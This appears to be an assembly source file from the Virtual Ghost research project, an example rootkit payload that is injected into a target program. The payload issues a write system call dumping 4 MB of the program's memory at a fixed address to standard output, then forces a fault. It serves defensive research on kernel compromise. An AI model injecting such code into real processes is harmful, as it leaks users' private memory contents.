/*===- injected.S - Example Rootkit =---------------------------------------===
 * 
 *                        Example Virtual Ghost Rootkit
 *
 * This file was developed by the LLVM research group and is distributed under
 * the University of Illinois Open Source License. See LICENSE.TXT for details.
 * 
 *===----------------------------------------------------------------------===
 *
 * This file provides the assembly code that is injected into the target
 * program.
 *
 *===----------------------------------------------------------------------===
 */

#define TARGET 0x89a000
#define SIZE 0x400000
#define FD 0x1

.global badcode
.type badcode, @function

.global endcode
.type endcode, @function

badcode:
  /*
   * Call the write system call.
   */
  movq $4, %rax
  movq $FD, %rdi
  movq $TARGET, %rsi
  movq $SIZE, %rdx
  syscall
  movq $0x0, 0xfed
endcode:

